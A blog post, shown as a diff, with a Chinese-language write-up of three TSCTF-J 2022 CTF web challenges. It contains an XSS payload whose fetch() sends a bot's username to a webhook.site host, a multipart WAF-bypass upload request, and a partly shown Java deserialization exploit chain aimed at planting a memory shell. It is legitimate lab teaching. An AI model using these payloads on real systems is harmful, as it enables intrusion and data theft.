@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>TSCTF-J 2022 词超人 &amp; 你的名字 &amp; ezja official(?) write up</title>
+    <meta name="description" content="Fortunate enough to get a glimpse of the feast of techiques.">
+    <meta name="keywords" content='Web'>
+
+    <meta property="og:url" content="https://kingbridgess.github.io/posts/tsctf-j-2022-%E8%AF%8D%E8%B6%85%E4%BA%BA%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97ezja-write-up/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="TSCTF-J 2022 词超人 &amp; 你的名字 &amp; ezja official(?) write up">
+    <meta property="og:description" content="Fortunate enough to get a glimpse of the feast of techiques.">
+    <meta property="og:image" content="/images/avatar.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="TSCTF-J 2022 词超人 &amp; 你的名字 &amp; ezja official(?) write up">
+    <meta name="twitter:description" content="Fortunate enough to get a glimpse of the feast of techiques.">
+    <meta property="twitter:domain" content="https://kingbridgess.github.io/posts/tsctf-j-2022-%E8%AF%8D%E8%B6%85%E4%BA%BA%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97ezja-write-up/">
+    <meta property="twitter:url" content="https://kingbridgess.github.io/posts/tsctf-j-2022-%E8%AF%8D%E8%B6%85%E4%BA%BA%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97ezja-write-up/">
+    <meta name="twitter:image" content="/images/avatar.jpg">
+
+    
+    <link rel="canonical" href="https://kingbridgess.github.io/posts/tsctf-j-2022-%E8%AF%8D%E8%B6%85%E4%BA%BA%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97ezja-write-up/" />
+
+    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/normalize.min.css" media="print" onload="this.media='all'">
+    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/main.css">
+    <link disabled id="dark-theme" rel="stylesheet" href="https://kingbridgess.github.io/css/dark.css">
+
+    <script src="https://kingbridgess.github.io/js/svg-injector.min.js"></script>
+    <script src="https://kingbridgess.github.io/js/feather-icons.min.js"></script>
+    <script src="https://kingbridgess.github.io/js/main.js"></script>
+
+    
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="https://kingbridgess.github.io">
+                <img src="https://kingbridgess.github.io/images/avatar.jpg" alt="avatar" />
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://kingbridgess.github.io">BRIdGE</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/posts/"> Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/tags/"> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/about"> About </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/contact/"> Contact </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
+                <a>
+                    <span id="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/posts/"> Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/tags/"> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/about"> About </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/contact/"> Contact </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
+                    <a>
+                        <span id="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>TSCTF-J 2022 词超人 &amp; 你的名字 &amp; ezja official(?) write up</h1>
+        <small role="doc-subtitle"></small>
+        <p class="post-date">
+            October 20, 2022
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="https://kingbridgess.github.io/tags/web">Web</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <h3 id="词超人">词超人</h3>
+<p>帮助大家美美过四六级（bushi</p>
+<p><img src="https://md.byr.moe/uploads/upload_1f866ece1f7c0e312ad4c1dcb9033141.png" alt=""></p>
+<p>一共1000个单词，填对所有单词返回flag</p>
+<h4 id="预期解-手填1000个单词">预期解: 手填1000个单词</h4>
+<p>人间正道是沧桑
+<img src="https://md.byr.moe/uploads/upload_7c114ef937f8d82583f22531916fc59e.jpg" alt=""></p>
+<h4 id="非预期解">非预期解</h4>
+<p>好了好了，说正事（</p>
+<p>本题灵感来源于针对刷课/刷题网站的脚本。</p>
+<p>一些不好好学英语的坏孩子提供了一些歪点子：</p>
+<ol>
+<li>浏览器控制台执行js脚本填入所有单词</li>
+<li>写python爬虫脚本发包</li>
+<li>字符串处理</li>
+</ol>
+<p>可以抓包看看前端发过去了什么东西</p>
+<p><img src="https://md.byr.moe/uploads/upload_b0e679c7f8600cab598dd63a1bbcce58.png" alt=""></p>
+<p>是一个id和answer组成的json数组。而仔细观察前端html源码会发现，每一个单词的id和answer都给了</p>
+<p><img src="https://md.byr.moe/uploads/upload_b811009d728fdb639ff6c282ae9b5542.png" alt=""></p>
+<h5 id="思路1">思路1</h5>
+<p>观察submit函数的这一部分</p>
+<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">const answerArray=[];
+let divArray=document.getElementsByClassName(&#39;chunk&#39;)
+for(div of divArray){
+    answerArray.push({id:div.id,answer:div.getElementsByTagName(&#39;input&#39;)[0].value})
+}
+</code></pre><p>answerArray就是最终发的数据。我们可以改其push的answer字段，让它是需要提交的英文答案。</p>
+<p><code>answerArray.push({id:div.id,answer:div.getElementsByClassName('en') [0].innerHTML})</code></p>
+<p>这里可能涉及到了利用javascript对dom元素操作的知识。不熟悉的同学可以看看w3的文档</p>
+<p><a href="https://www.w3schools.com/js/js_htmldom_elements.asp">https://www.w3schools.com/js/js_htmldom_elements.asp</a></p>
+<p>然后把修改后的submit函数复制到浏览器控制台里</p>
+<p><img src="https://md.byr.moe/uploads/upload_bbd4734177ee9308578c59bdda354672.png" alt=""></p>
+<p>点击提交</p>
+<p><img src="https://md.byr.moe/uploads/upload_2753730b26ef37426de54f47eba44ed3.png" alt=""></p>
+<p>另外，也可以直接在控制台写脚本把所有词都填上</p>
+<p>getby方法</p>
+<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">const divArray=document.getElementsByClassName(&#39;chunk&#39;)
+for(div of divArray){
+    const en=div.getElementsByClassName(&#39;en&#39;)[0].innerHTML
+    div.getElementsByTagName(&#39;input&#39;)[0].value=en
+}
+</code></pre><p>或者用querySeletor一行搞定</p>
+<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">[...document.querySelectorAll(&#34;.chunk&#34;)].forEach(
+  (c) =&gt;
+    (c.querySelector(&#34;input&#34;).value = c.querySelector(&#34;.en&#34;).innerHTML.trim())
+);
+</code></pre><h5 id="思路2">思路2</h5>
+<p>熟悉正则表达式的同学大可以写一个python爬虫，构造出所有答案正确的json后提交</p>
+<pre tabindex="0"><code class="language-python=" data-lang="python=">import requests
+import re
+url=&#39;http://49.232.201.163:46128&#39;
+text=requests.get(url).text
+idArray=re.findall(r&#39;&lt;div id=&#34;(.+)&#34; class=&#34;chunk&#34; style=&#34; width: 30%;margin: 25px auto;text-align: left;&#34;&gt;&#39;,text)
+enArray=re.findall(r&#39;&lt;p class=&#34;en&#34; style=&#34;visibility:hidden;display: inline&#34;&gt;(.+)&lt;/p&gt;&#39;,text)
+answerArray=[]
+for i in range(len(idArray)):
+    answerArray.append({&#39;id&#39;:idArray[i],&#39;answer&#39;:enArray[i]})
+print(requests.post(url+&#39;/submit&#39;,json=answerArray).text)
+</code></pre><p>或者使用python爬虫常用的beautifulsoup</p>
+<pre tabindex="0"><code class="language-python=" data-lang="python=">import requests
+from bs4 import BeautifulSoup
+url=&#39;http://49.232.201.163:46128&#39;
+text=requests.get(url).text
+soup = BeautifulSoup(text, &#39;html.parser&#39;)
+divArray = soup.find_all(&#34;div&#34;, {&#34;class&#34;: &#34;chunk&#34;})
+answerArray=[]
+for div in divArray:
+    answerArray.append({
+        &#39;id&#39;:div[&#39;id&#39;],
+        &#39;answer&#39;:div.find(&#39;p&#39;,{&#39;class&#39;:&#39;en&#39;}).text
+    })
+print(requests.post(url+&#39;/submit&#39;,json=answerArray).text)
+</code></pre><h5 id="思路3">思路3</h5>
+<p>字符串处理，即想办法拼接出一个正确的json，放到burpsuite里直接发包。可以使用word等工具进行字符串的查找和替换。似乎比较麻烦..？所以再此不做赘述。</p>
+<p>flag:</p>
+<p><code>TSCTF-J{naughty_or_diligent–which_type_you_are?^_^}</code></p>
+<h4 id="补充知识">补充知识</h4>
+<p>可能有同学好奇后端是怎么检验答案的，也有同学私聊我想玩一些花活来绕过检验XD</p>
+<p>后端是用springboot写的，感兴趣的同学可以看看源码</p>
+<p><a href="https://github.com/KingBridgeSS/my_ctf_challenges/tree/main/TSCTF-J%202022">https://github.com/KingBridgeSS/my_ctf_challenges/tree/main/TSCTF-J%202022</a></p>
+<p>后端把用户传进来的answerArray序列化为字节码，然后计算MD5值。通过比对用户的MD5值是否和正确答案的MD5值是否相等判断所有答案是否正确。</p>
+<p><img src="https://md.byr.moe/uploads/upload_79e58d4ed21eeef058748728332b19d0.png" alt=""></p>
+<h3 id="你的名字">你的名字</h3>
+<p>本题灵感来源于大火的匿名提问箱，挺想知道在提问箱里说骚话的人是谁哈哈。</p>
+<p>具体而言，这是一个只需要用浏览器就能做的炒鸡简单xss题，而且怕同学们不熟悉还给了一个readme文档，没想到最后才3解呜呜呜</p>
+<p>这里再贴一下文档</p>
+<blockquote>
+<p>看来你真的很想知道提问者的名字hh</p>
+<p>好吧。。。为了知道ta是谁，你不一定需要打穿这台服务器。你可以借助XSS进行钓鱼（真的还有那么好心的出题人把考点直接告诉你吗）</p>
+<p>可能同学们并不熟悉CTF中前端题的机制，我这里简单介绍一下。</p>
+<p>既然要钓鱼，就必须有人去点击页面。但是你真的忍心让bridge 24小时在电脑前帮你点链接吗 = =</p>
+<p>为了达到模拟受害者的目的，CTF比赛中通常会设置一个xss bot来访问钓鱼界面。以这一题为例：</p>
+<p>当你回答好问题后，点击<code>让TA看看我的回答！</code>按钮，题目中的BOT就会以此问题提问者的身份去访问<code>/myasks</code>界面（即<code>我的提问</code>）查看你的回答。如果该页面存在xss漏洞，就很有可能造成信息泄露。而在本题中，**BOT的用户名就是flag。**你可以尝试自问自答，看看以提问者的视角，自己的用户名会出现在该页面的哪个位置。</p>
+<p>至于怎么在该页面执行javascript脚本，制造xss并泄露信息	，这就需要同学们自行发挥咯！</p>
+<p>好吧 xD 测题的时候还是被 diss 难度太大555。能造成xss的可控制输入点<code>username</code>和<code>answer</code>是有过滤的。过滤函数如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> checkUserName(username){
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">return</span> username.length<span style="color:#ff79c6">&lt;=</span><span style="color:#bd93f9">10</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">async</span> <span style="color:#8be9fd;font-style:italic">function</span> sanitizeAnswer(questions){
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span>(q <span style="color:#ff79c6">of</span> questions){
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// 把 &lt; 替换成html实体 &amp;lt;
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  q.answer<span style="color:#ff79c6">=</span>q.answer.replace(<span style="color:#f1fa8c">/&lt;/g</span>,<span style="color:#f1fa8c">&#39;&amp;lt;&#39;</span>)
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// 这是后端的逻辑，并不重要hhh
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">const</span> askee<span style="color:#ff79c6">=</span><span style="color:#ff79c6">await</span> usersDB.findOne({<span style="color:#f1fa8c">&#39;userId&#39;</span><span style="color:#ff79c6">:</span>q.askeeId})
+</span></span><span style="display:flex;"><span>  q.askeeName<span style="color:#ff79c6">=</span>askee.username
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>想想看怎么绕过呢？</p>
+<p>最后最后，同学们可能需要用到信息外带（即把flag发送到远程服务器）。这里推荐一个比较稳定的webhook网站。</p>
+<p><a href="https://requestbin.com/r">https://requestbin.com/r</a></p>
+<p>亲测在本题环境中，http协议（把网站给你提供的https链接中的s去掉即可）GET方法可以接收到请求。</p>
+<p>另外如果有条件代理的同学可以使用这个网站，更加稳定</p>
+<p><a href="https://webhook.site/">https://webhook.site/</a></p>
+<p>实在不行，可以google搜索<code>xss平台</code>。如果用不了google，可以试试这几个xss平台网站</p>
+<p><a href="https://xss8.cc/">https://xss8.cc/</a></p>
+<p><a href="https://xssaq.com/">https://xssaq.com/</a></p>
+<p><a href="http://xss.hwact.org/index.php?do=login">http://xss.hwact.org/index.php?do=login</a></p>
+<p>另外还有一点，为了防止同学们撞车，<strong>建议大家在注册的时候设置复杂的密码</strong></p>
+<p>如果你觉得题目还有任何问题（which几乎肯定会有XD），请务必私聊我 qq: 1244992934</p>
+<p>祝你找到TA !</p>
+</blockquote>
+<p>那么思路就非常明确，在以bot视角下的<code>/myasks</code>页面制造xss，然后把bot的用户名外带出去。</p>
+<p>网站是一个匿名提问箱，在主页可以看到他人对你提出的问题，你可以作出回答；在<code>提问别人</code>页面可以根据用户id对他人提问题；<code>我的提问</code>页面可以看到你对他人的提问；在<code>查看/更改我的信息</code>可以查看和修改用户名，用户密码；<code>重新登陆</code>不解释；最后，<code>让TA看看我的回答</code>页面可以调用bot访问<code>我的提问</code>页面。</p>
+<p>制造xss的注入点文档已经明确指出了，下面自问自答看看这两个注入点的具体位置。注意，在提问者bot的视角，攻击者的用户名才是可控的。</p>
+<p><img src="https://md.byr.moe/uploads/upload_3014a1cd8511bf8313f96a9e6a5f356c.png" alt=""></p>
+<p>对应的html源码位置</p>
+<p><img src="https://md.byr.moe/uploads/upload_15684ee0abf40d56401eacec06a171ed.png" alt=""></p>
+<p>别忘了readme里给出的这两个注入点的过滤：用户名长度要小于10，answer不能包含<code>&lt;</code>（会被转义）</p>
+<p>上网搜一下xss的基本原理，发现基本都是通过img等标签的onXXX属性执行js，或者直接构造script标签写js代码</p>
+<p>所以，首先至少需要构造一个标签。但是呢，如果在username处构造，可输入的内容太少；如果在answer注入又无法构造标签的开头。</p>
+<p>但是！如果结合两个注入点，在username构造<code>&lt;</code>，然后在answer用<code>&gt;</code>闭合，就能构造出一个完整的标签！</p>
+<p>但是，为了构造一个正确的img标签，还需要让两个注入点中间的部分消失。这里可以通过把中间的部分构造成标签的一个属性的值来做到。然后在img标签构造onerror属性来执行js代码。最后别忘了引号和标签的闭合</p>
+<p>Talk is cheap, show me the code:</p>
+<pre tabindex="0"><code>username = &lt;img src=&#39;
+answer = &#39; onerror=&#34;alert(&#39;xss&#39;)&#34;&gt;
+</code></pre><p><img src="https://md.byr.moe/uploads/upload_8abd9e44dba97a85f0fa8ff718ee03de.png" alt=""></p>
+<p>成功执行alert函数！</p>
+<p><img src="https://md.byr.moe/uploads/upload_b11dddc1ad8e212faec5ec790458cfe8.png" alt=""></p>
+<p>既然可以执行任意javascript代码，直接在前端发个包，内容带上bot的用户名（即flag）给攻击者服务器即可。服务器可以使用文档里提供的一万个webhook</p>
+<p>先看看以bot的视角用户名在哪</p>
+<p><img src="https://md.byr.moe/uploads/upload_6d00b8d0fc1cbe60d10777b8f9b8e428.png" alt=""></p>
+<p><img src="https://md.byr.moe/uploads/upload_21f0523102b38dc4bc179c96d7d9fe3c.png" alt=""></p>
+<p>用getby把这段文本选择出来</p>
+<p><code>document.getElementsByClassName('outer')[0].getElementsByTagName('h1')[0].innerText</code></p>
+<p>可以在控制台调试一下</p>
+<p><img src="https://md.byr.moe/uploads/upload_a85503106b0b59d315cfc6616537a56f.png" alt=""></p>
+<p>或者直接把整个html页面带出去也不是不行。</p>
+<p><code>document.body.innerHTML</code></p>
+<p>js发送请求包网上随便搜搜就能找到。比如使用fetch函数。最终构造的username和answer如下</p>
+<pre tabindex="0"><code>username = &lt;img src=&#39;
+answer = 
+&#39; onerror=&#39;fetch(&#34;https://webhook.site/xxx/?flag=&#34;+document.getElementsByClassName(&#34;outer&#34;)[0].getElementsByTagName(&#34;h1&#34;)[0].innerText)&#39;&gt;
+</code></pre><p>webhook成功收到用户名（即flag）</p>
+<p><img src="https://md.byr.moe/uploads/upload_a519e3490600f7e9d479fb1327aaff9e.png" alt=""></p>
+<p>flag: <code>TSCTF-J{Hope_we_meet_the_ones}</code></p>
+<p>(饱含对各位的真挚祝愿 = =)</p>
+<h4 id="补充">补充</h4>
+<p>同样，感兴趣的同学可以研究一下题目源码。（其实这题写着写着就成了一个小项目了XD）</p>
+<p>技术栈是 mdb.js前端+node后端+mongoDB数据库+puppeteer+chrome headless</p>
+<p><a href="https://github.com/KingBridgeSS/my_ctf_challenges/tree/main/TSCTF-J%202022">https://github.com/KingBridgeSS/my_ctf_challenges/tree/main/TSCTF-J%202022</a></p>
+<p>比赛过程中，有同学试图通过偷bot的cookie来登录bot账号，这不失为一种好思路。但是为了防止同学们登录之后干坏事，我给bot设置了http only</p>
+<p><img src="https://md.byr.moe/uploads/upload_32b03a606b7e30892e03ad9af7d2a660.png" alt=""></p>
+<p>这样就没有办法通过javascript获取cookie。</p>
+<p>另外，可能有同学好奇xss产生的原因。后端使用ejs进行模板渲染。在源码的<code>myask.ejs</code>文件中，发现<code>askeeName</code>和<code>answer</code>字段都是用<code>&lt;%- xxx %&gt;</code>渲染的。</p>
+<p><img src="https://md.byr.moe/uploads/upload_2e7f682dae04daab10b83e46fd1d5ffb.png" alt=""></p>
+<p>查看ejs <a href="https://ejs.co/">官方文档</a> ，发现这个标签对内容没有任何过滤。由此造成xss。</p>
+<p><img src="https://md.byr.moe/uploads/upload_e362cb5ae1c747f8c08ee52093547acc.png" alt=""></p>
+<h3 id="ezja">ezja</h3>
+<p>学长给国赛决赛出的逆天题目orz&hellip;这里简单写一下bridge当时测题的历程，就当激发同学们学习java安全的兴趣（</p>
+<p>扫描网站目录发现</p>
+<p><code>http://123.57.193.197:8082/robots.txt</code></p>
+<p>内容：</p>
+<p><code>User-agent: * Disallow: /getSourceHere</code></p>
+<p>抓包试了试，脑电波对上了，应该是要传一个名为文件名是否为<code>giveMeSource</code>的文件名，上传成功就给你源码。但是后端会检测文件名是否包含<code>giveMeSource</code>，是的话就被拦截。</p>
+<p>搜了下发现这篇文章</p>
+<p><a href="https://paper.seebug.org/1930/">探寻 Java 文件上传流量层面 waf 绕过</a></p>
+<p>于是构造出这样一个报文（不要在意文件的内容）</p>
+<pre tabindex="0"><code>POST /getSourceHere HTTP/1.1
+Host: 123.57.193.197:8082
+Content-Length: 272
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://123.57.193.197:8082
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjoDmGrdoPcndzeWk
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://123.57.193.197:8082/getSourceHere
+Accept-Encoding: gzip, deflate
+Accept-Language: en,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7
+Connection: close
+
+------WebKitFormBoundaryjoDmGrdoPcndzeWk
+Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;UTF-8&#39;foo&#39;11&#34;;filename*=&#34;1.txt&#34;;filename*=&#34;%67%69%76%65%4d%65%53%6f%75%72%63%65&#34;;
+
+copy test1.png/b+shell.phtml/a png_shell.png
+------WebKitFormBoundaryjoDmGrdoPcndzeWk--
+</code></pre><p>发包后就可以下载源码。</p>
+<p>然后想吐槽一下nama的水管服务器&hellip;我中间去洗了个衣服，回来还是没下完hh</p>
+<p>把jar包下下来，用jd-gui反编译。会发现这是一个springboot应用</p>
+<p>POM包有<code>commons-collections4</code>依赖，待会可能可以打cc2链</p>
+<p><img src="https://md.byr.moe/uploads/upload_4e949e36a30df27036c7e996b391a8de.png" alt=""></p>
+<p>其中<code>SerialController</code>有两个反序列化点</p>
+<p><img src="https://md.byr.moe/uploads/upload_d0b8607e72f1c951ca8494b1eac3f4ce.png" alt=""></p>
+<p>第一个是fastjson，查看pom包发现是最新版本，没有什么公开的POC可以打，但是记得其可以触发java bean的任意getter setter方法。另一个是java原生反序列化点，但是限制了500字节。按常规的cc4链不可能打得通。</p>
+<p>找啊找，发现题目自己写了一个很有意思的类</p>
+<p><code>com.ciscn.util.SKTest.SerialKillerTest</code></p>
+<p>其<code>getSerialBytes</code>可以进行没有长度限制的反序列化。结合fastjson可以进到这一个地方打一个二次反序列化。</p>
+<p><img src="https://md.byr.moe/uploads/upload_be1181d6b853b82b2a7bea257ea58c57.png" alt=""></p>
+<p>但是会发现有基类黑名单</p>
+<p><img src="https://md.byr.moe/uploads/upload_763a514bd9434a94c23682b3a77b50c4.png" alt=""></p>
+<p>最骚的是还是类似fastjson高版本的哈希黑名单，所以按预期解还需要fuzz</p>
+<p><img src="https://md.byr.moe/uploads/upload_714f602122242ab6a09d45dbac190917.jpg" alt=""></p>
+<p>但是当时没想太多，直接用<code>RMIConnector.connect()</code>三次反序列化，结果真就打通了。。估计是脑电波对上了吧哈哈。</p>
+<p>另外题目不出网，需要种一个内存马。</p>
+<p>所以就是fastjson触发getter+getSerialBytes二次反序列化+cc2链魔改三次反序列化+cc2链配合TemplatesImpl加载字节码+Tomcat内存马。生成json的POC如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.alibaba.fastjson.JSON<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.alibaba.fastjson.parser.ParserConfig<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.ciscn.util.Person<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.ciscn.util.SKTest<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.ClassPool<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections4.comparators.TransformingComparator<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections4.functors.InvokerTransformer<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.management.remote.JMXServiceURL<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.management.remote.rmi.RMIConnector<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ByteArrayInputStream<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ByteArrayOutputStream<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ObjectInputStream<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ObjectOutputStream<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.Field<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.net.MalformedURLException<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.Base64<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.HashMap<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.PriorityQueue<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Test</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        Person person=new Person(1,&#34;name&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">//        SKTest skTest=new SKTest();
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">//        skTest.setSerialBytes(serialize(person));
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">//        System.out.println(JSON.toJSONString(skTest));
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">//        {&#34;serialBytes&#34;:&#34;rO0ABXNyABVjb20uY2lzY24udXRpbC5QZXJzb24V2wbKnAOSiAIAAkkAAmlkTAAEbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwAAAAAXQABG5hbWU=&#34;}
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> expBytes<span style="color:#ff79c6">=</span>serialize<span style="color:#ff79c6">(</span>getPriorityQueueExp<span style="color:#ff79c6">());</span>
+</span></span><span style="display:flex;"><span>        String exp<span style="color:#ff79c6">=</span> Base64<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getEncoder</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">encodeToString</span><span style="color:#ff79c6">(</span>expBytes<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        RMIConnector rmiConnector<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> RMIConnector<span style="color:#ff79c6">(</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">new</span> JMXServiceURL<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;service:jmx:rmi://localhost:12345/stub/&#34;</span><span style="color:#ff79c6">+</span>exp<span style="color:#ff79c6">),</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">&lt;</span>String<span style="color:#ff79c6">,</span>Integer<span style="color:#ff79c6">&gt;()</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        InvokerTransformer invokerTransformer<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> InvokerTransformer<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;connect&#34;</span><span style="color:#ff79c6">,</span><span style="color:#ff79c6">null</span><span style="color:#ff79c6">,</span><span style="color:#ff79c6">null</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//invokerTransformer.transform(rmiConnector)
